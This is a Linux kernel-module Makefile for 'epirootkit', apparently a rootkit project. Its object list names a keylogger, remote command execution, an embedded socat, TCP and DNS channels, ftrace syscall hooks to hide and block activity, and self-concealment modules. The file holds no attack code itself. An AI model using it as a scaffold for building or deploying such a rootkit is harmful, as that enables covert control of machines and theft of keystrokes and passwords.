KERNELDIR := /lib/modules/$(shell uname -r)/build
PWD       := $(shell pwd)

ccflags-y := 								    \
    -I$(src) 							        \
    -I$(src)/include 					        \
    -I$(src)/network/core					    \
    -I$(src)/interceptor/core/include 	        \
    -I$(src)/interceptor/hooks/alterate         \
    -I$(src)/interceptor/hooks/forbid 	        \
    -I$(src)/interceptor/hooks/hide             \
    -I$(src)/passwd 				            \
    -I$(src)/utils/io 					        \
    -I$(src)/utils/ulist 				        \
    -I$(src)/utils/crypto                             

obj-m    := epirootkit.o

epirootkit-objs :=                              \
    main.o                                      \
    exec_cmd.o                                  \
    socat.o                                     \
    file_ops.o                                  \
    epikeylog.o                                 \
    rootkit_command.o                           \
    vanish.o                                    \
	utils/crypto/hash.o                         \
	utils/crypto/aes.o                          \
    network/core/network.o                      \
	network/protocols/tcp/socket.o              \
    network/protocols/tcp/worker.o              \
    network/protocols/dns/dns.o                 \
    network/protocols/dns/worker.o              \
    interceptor/core/init.o                     \
    interceptor/core/array.o                    \
    interceptor/core/menu.o                     \
    interceptor/core/ftrace.o                   \
    interceptor/hooks/alterate/alterate.o       \
    interceptor/hooks/alterate/alterate_api.o   \
    interceptor/hooks/forbid/forbid.o           \
    interceptor/hooks/forbid/forbid_api.o       \
    interceptor/hooks/hide/hide.o               \
    interceptor/hooks/hide/hide_api.o           \
    interceptor/misc/ghost.o                    \
    utils/io/io.o                               \
    passwd/passwd.o                             \
    utils/ulist/ulist.o

all: modules

modules:
	@./scripts/generate_socat_h.sh
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean

.PHONY: all modules clean
